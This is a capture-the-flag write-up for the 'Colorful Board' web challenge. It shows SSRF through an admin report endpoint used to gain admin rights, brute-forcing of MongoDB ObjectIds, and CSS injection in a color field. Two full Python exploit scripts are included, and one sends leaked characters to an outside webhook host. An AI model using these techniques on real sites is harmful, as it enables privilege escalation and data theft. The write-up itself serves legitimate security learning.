# Web/Colorful Board

## Description

Color your username colorful!

Attachments: [sample-colorful_board.zip](./sample-colorful_board.zip)

## Challenge Overview

This was one of the best challenges in the entire CTF. Had a lot of fun solving this one!

We are given a simple website that allows us to create `posts` and then view and edit (but only admins can edit) them.  The unique thing about it was that during the registration it also took a `personalColor` which was the color with which our username would be displayed whenever we view our post.

Analyzing the source, we can see in `init-data.js` that the flag was stored in the database inside `notices`.

app/src/api/admin/admin.controller.ts
```ts
import { Body, Controller, Get, Param, Post, Query, Render, UseGuards } from '@nestjs/common';
import { AdminService } from './admin.service';
import { AdminGuard, LocalOnlyGuard } from 'src/common/guard';
import { Types } from 'mongoose';

@Controller('admin')
export class AdminController {
    constructor(
        private readonly adminService: AdminService
    ) { }

    @Get('/grant')
    @UseGuards(LocalOnlyGuard)
    async grantPerm(@Query('username') username: string) {
        return await this.adminService.authorize(username);
    }

    @Get('/notice')
    @UseGuards(AdminGuard)
    @Render('notice-main')
    async renderAllNotice() {
        const notices = await this.adminService.getAllNotice();

        return { notices: notices.filter(notice => !notice.title.includes("flag")) };
    }

    @Get('/report')
    async test(@Query('url') url: string) {
        await this.adminService.viewUrl(url);

        return { status: 200, message: 'Reported.' };
    }

    @Get('/notice/:id')
    @UseGuards(AdminGuard)
    @Render('notice')
    async renderNotice(@Param('id') id: Types.ObjectId) {
        const notice = await this.adminService.getNotice(id);

        return { notice: notice };
    }
}
```

Here we see that there are many subroutes starting with `/admin`. One of them is `/admin/report/` which makes the admin visit any `url` that we provide inside the url parameter.

There are more interesting functions.
* `/admin/grant/` - Makes the `username` we provide an admin user (sets `isAdmin` to `true` in the JWT). But it can only be run locally
* `/admin/notice` - Shows all the notices except the flag
* `/admin/notice/:id` - Shows the notice with the specified `id`. It also doesn't check if it is the flag or not.

Also there is the `/post/edit/:id` which allows us to edit a post but this also can be accessed only by admins.

## Exploit

First we need to find a way to get admin privileges. For this we can do an SSRF attack by sending a request to `/report?url=http://localhost:1337/admin/grant?username=hacker`. This makes the server access the `/admin/grant` locally makes our created user (`hacker`) an admin.

Now with this we can access all the pages that need admin access.

Next, we need to find a way to get the `id` of the flag notice. One of my teammates noticed that the `id` of the two given notices different only by `characters` so what we did bruteforced at just those two indices and that literally gave us the `id` for the flag and the second part of the flag. It was only after the CTF I found that it is an vulnerability in how MongoDb generates ids. ([Mongo Objectid Predict](https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb#mongo-objectid-predict))

bruteforce.py
```py
import requests
import re

baseURL = "https://149f10ef5e1c3d471e0588fc.deadsec.quest"

def register(username, password, personalColor):
    url = baseURL + "/auth/register"
    sendJSON = {"username": username, "password": password, "personalColor": personalColor}
    r = requests.post(url, json=sendJSON)
    return r

def login(username, password):
    url = baseURL + "/auth/login"
    sendJSON = {"username": username, "password": password}
    r = requests.post(url, json=sendJSON)
    return r

user = "hacker"
passwd = "hacker"
personalColor = "#369369"
print(register(user, passwd, personalColor).json())

res = login(user, passwd).json()
print(res)
TOKEN=res["accessToken"]
print("accessToken:", TOKEN)

def makeAdmin(username, accessToken=TOKEN):
    url = baseURL + "/admin/report?url=http://localhost:1337/admin/grant?username=" + username
    sendCookie = {"accessToken": accessToken}
    r = requests.get(url, cookies=sendCookie)
    return r

print(makeAdmin(user).json())

# Login again to get new token
res = login(user, passwd).json()
print(res)
TOKEN=res["accessToken"]
print("accessToken:", TOKEN)


def getAdminNotice(noticeURL, accessToken=TOKEN):
    url = baseURL + "/admin/notice/" + noticeURL
    sendCookie = {"accessToken": accessToken}
    r = requests.get(url, cookies=sendCookie)
    return r

def getAllNotice(accessToken=TOKEN):
    url = baseURL + "/admin/notice"
    sendCookie = {"accessToken": accessToken}
    r = requests.get(url, cookies=sendCookie)
    res = r.text
    posts = re.findall("/admin/notice/[0-9a-f]{24}", res)
    return posts

notice = getAllNotice(TOKEN)[0][14:]
# notice[7], notice[-1]
characters = "abcdef1234567890"
for first in characters:
    for second in characters:
        newNotice = notice[0:7] + first + notice[8:-1] + second
        res = getAdminNotice(newNotice).text
        if '404' not in res:
            print(newNotice, res)
```

Now we need to find the first part of the flag. For this we use CSS Injection in the `personalColor` field. We can insert whatever CSS want in the `personalColor`. We can use it to exfiltrate the username of the admin (which is the first part of the flag) using the `input[class=user][value^=FLAG]` selector and then sending a request to our webhook using `background: url()`.

exploit.py
```py
import requests
import re
from os import urandom

TOKEN=""
baseURL = "https://b2c742d9f8b3584414958c4e.deadsec.quest"

def register(username, password, personalColor):
    url = baseURL + "/auth/register"
    sendJSON = {"username": username, "password": password, "personalColor": personalColor}
    r = requests.post(url, json=sendJSON)
    return r

def login(username, password):
    url = baseURL + "/auth/login"
    sendJSON = {"username": username, "password": password}
    r = requests.post(url, json=sendJSON)
    return r

def write(title, content, accessToken=TOKEN):
    url = baseURL + "/post/write"
    sendJSON = {"title": title, "content": content}
    sendCookie = {"accessToken": accessToken}
    r = requests.post(url, json=sendJSON, cookies=sendCookie)
    return r

def getAllPosts(accessToken=TOKEN):
    url = baseURL + "/post"
    sendCookie = {"accessToken": accessToken}
    r = requests.get(url, cookies=sendCookie)
    res = r.text
    posts = re.findall("/post/[0-9a-f]{24}", res)
    return posts

def getPost(postURL, accessToken=TOKEN):
    url = baseURL + postURL
    sendCookie = {"accessToken": accessToken}
    r = requests.get(url, cookies=sendCookie)
    return r

def sendAdmin(postid, accessToken):
    url = 'https://b2c742d9f8b3584414958c4e.deadsec.quest/admin/report?url=http://localhost:1337/post/edit/' + postid
    sendCookie = {"accessToken": accessToken}
    return requests.get(url, cookies=sendCookie)


user = str(urandom(16).hex())
print("User:",user)
passwd = user

# Crafting the Exploit
# characters = "ABCDEFGHIJKLMNOPQRSTUVXYZ"
characters = "abcdefghijklmnopqrstuvwxyz1234567890_"
flag = "DEAD{Enj0y_y" # Enter the next character after viewing it on the webhook
finalExploit = '#369369; } '
for letter in characters:
    letterExploit = 'input[class=user][value^="'+ flag + letter + '"] {background: url(https://dragon.requestcatcher.com/' + flag+letter+');} '
    finalExploit += letterExploit
letterExploit = 'input[class=user][value^="'+ flag + '}' + '"] {background: url(https://dragon.requestcatcher.com/' + flag+'}'+'); '
finalExploit += letterExploit
print(finalExploit)

print("Register:", register(user, passwd, finalExploit).json())

res = login(user, passwd).json()
token = res["accessToken"]
print(f"{token=}")

title = "RandomHacker"
content = "RandomHacker"
print("Write:", write(title, content, token).text)

myPosts = getAllPosts(token)
print("Posts:")
for post in myPosts:
    print(post[6:], sendAdmin(post[6:], token).text)
```

We cannot send both the uppercase and lowercase characters together as that makes the CSS too long so I had to make two separate `characters` variable and I alternated between the two if one didn't work (although it was  needed only for the first character). 

Also I had to keep updating the `flag` by looking at the response from the webhook. Pretty sure it is possible to automate the entire process (but I had very little time and had submitted this flag only 1 min before the CTF finished 😁).

And that's how you get your flag!